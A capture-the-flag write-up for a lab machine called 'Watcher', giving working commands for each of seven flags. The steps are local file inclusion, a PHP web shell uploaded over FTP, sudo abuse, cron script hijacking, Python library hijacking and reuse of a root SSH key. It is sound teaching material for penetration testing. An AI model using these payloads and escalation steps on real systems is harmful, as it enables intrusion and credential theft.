# Watcher - CTF Write-up

This machine involves a multi-stage exploitation path, starting from web vulnerabilities and progressing through multiple levels of privilege escalation on a Linux system.

## Summary
- **Target IP:** 10.48.146.127
- **Host OS:** Linux (Ubuntu)
- **Primary Vulnerabilities:** LFI, Improper Permissions, Cron Job Hijacking, Python Library Hijacking, Information Leakage.

---

## 1. Flag 1 - Information Gathering
Initial reconnaissance of the web server revealed a `robots.txt` file.

**Command:**
```bash
curl -s http://10.48.146.127/robots.txt
```

**Output:**
```
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

Accessing `/flag_1.txt` provided the first flag.

**Flag 1:** `FLAG{robots_dot_text_what_is_next}`

---

## 2. Flag 2 - Initial Foothold & FTP Access
While `/secret_file_do_not_read.txt` returned a 403 Forbidden error directly, the web application had a Local File Inclusion (LFI) vulnerability in `post.php`.

**LFI Exploitation:**
```bash
curl -s "http://10.48.146.127/post.php?post=secret_file_do_not_read.txt"
```

The output contained FTP credentials:
- **Username:** `ftpuser`
- **Password:** `givemefiles777`

Logging into the FTP server revealed the second flag.

**Command:**
```bash
curl -s ftp://ftpuser:givemefiles777@10.48.146.127/flag_2.txt
```

**Flag 2:** `FLAG{ftp_you_and_me}`

---

## 3. Flag 3 - LFI to RCE
The FTP server allowed file uploads into a `files/` directory, which mapped to `/home/ftpuser/ftp/files/` on the system.

**Exploitation Steps:**
1. Upload a PHP web shell:
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.php
   curl -s -T shell.php ftp://ftpuser:givemefiles777@10.48.146.127/files/shell.php
   ```

2. Execute commands via LFI:
   ```bash
   curl -s "http://10.48.146.127/post.php?post=/home/ftpuser/ftp/files/shell.php&cmd=id"
   ```

3. Locate and read Flag 3:
   ```bash
   curl -s "http://10.48.146.127/post.php?post=/home/ftpuser/ftp/files/shell.php&cmd=find /var/www/html -name flag_3.txt"
   # Found at /var/www/html/more_secrets_a9f10a/flag_3.txt
   curl -s http://10.48.146.127/more_secrets_a9f10a/flag_3.txt
   ```

**Flag 3:** `FLAG{lfi_what_a_guy}`

---

## 4. Flag 4 - Privilege Escalation to 'toby'
Checking the sudo permissions for the current user (`www-data`):

**Command:**
```bash
curl -s "http://10.48.146.127/post.php?post=/home/ftpuser/ftp/files/shell.php&cmd=sudo -l"
```

**Output:**
```
User www-data may run the following commands on ip-10-48-146-127:
    (toby) NOPASSWD: ALL
```

`www-data` can run any command as user `toby` without a password.

**Command:**
```bash
curl -s "http://10.48.146.127/post.php?post=/home/ftpuser/ftp/files/shell.php&cmd=sudo -u toby cat /home/toby/flag_4.txt"
```

**Flag 4:** `FLAG{chad_lifestyle}`

---

## 5. Flag 5 - Privilege Escalation to 'mat'
Enumerating the system as `toby` revealed a scheduled task.

**Command:**
```bash
curl -s "http://10.48.146.127/post.php?post=/home/ftpuser/ftp/files/shell.php&cmd=sudo -u toby cat /etc/crontab"
```

**Crontab entry:**
```
*/1 * * * * mat /home/toby/jobs/cow.sh
```

The script `/home/toby/jobs/cow.sh` is owned by `toby` but executed by `mat`. By modifying this script, we can gain execution as `mat`.

**Exploitation:**
```bash
# Overwrite the script with a reverse shell or a command to exfiltrate the flag
curl -s "http://10.48.146.127/post.php?post=/home/ftpuser/ftp/files/shell.php&cmd=echo 'cp /home/mat/flag_5.txt /tmp/flag5.txt; chmod 777 /tmp/flag5.txt' > /home/toby/jobs/cow.sh"
# Wait 1 minute for cron to execute
curl -s "http://10.48.146.127/post.php?post=/home/ftpuser/ftp/files/shell.php&cmd=cat /tmp/flag5.txt"
```

**Flag 5:** `FLAG{live_by_the_cow_die_by_the_cow}`

---

## 6. Flag 6 - Privilege Escalation to 'will'
Checking sudo permissions for user `mat` (via a reverse shell as `mat` or chained commands):

**Sudo Permissions:**
```
User mat may run the following commands on ip-10-48-146-127:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

The script `/home/mat/scripts/will_script.py` contained the following:
```python
import os
import sys
from cmd import get_command
# ...
```

Since the script imports a module named `cmd` and there is a writable `cmd.py` in the same directory (`/home/mat/scripts/`), we can perform **Python Library Hijacking**.

**Exploitation:**
1. Create a malicious `cmd.py` in `/home/mat/scripts/`:
   ```python
   import os
   os.system("cat /home/will/flag_6.txt > /tmp/flag6.txt; chmod 777 /tmp/flag6.txt")
   def get_command(num): return "ls"
   ```

2. Run the script with sudo:
   ```bash
   sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
   ```

**Flag 6:** `FLAG{but_i_thought_my_script_was_secure}`

---

## 7. Flag 7 - Root Escalation
User `will` was found to be a member of the `adm` group. This group often has access to log files and administrative data.

Enumeration of the `/opt` directory revealed a backup folder.

**Command:**
```bash
ls -la /opt/backups
```

**Output:**
```
-rw-rw---- 1 root adm  2270 Dec  3  2020 key.b64
```

The file `key.b64` contained a base64-encoded SSH private key for the root user.

**Exploitation:**
1. Extract and decode the key:
   ```bash
   cat /opt/backups/key.b64 | base64 -d > id_rsa_root
   chmod 600 id_rsa_root
   ```

2. Access the root account:
   ```bash
   ssh -i id_rsa_root root@localhost
   ```

3. Read the final flag:
   ```bash
   cat /root/flag_7.txt
   ```

**Flag 7:** `FLAG{who_watches_the_watchers}`
